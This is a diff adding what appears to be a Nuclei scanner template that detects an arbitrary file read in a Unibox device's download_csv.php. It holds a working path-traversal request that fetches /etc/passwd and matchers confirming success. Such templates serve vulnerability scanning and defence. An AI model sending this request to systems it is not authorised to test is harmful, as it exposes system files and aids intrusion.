@@ -1,0 +1,26 @@
+id: Unibox-download_csv-ReadAnyFile
+
+info:
+  name: Unibox-download_csv-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    Unibox-download_csv-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root:x"
+          - "/bin/bash"
+        condition: and
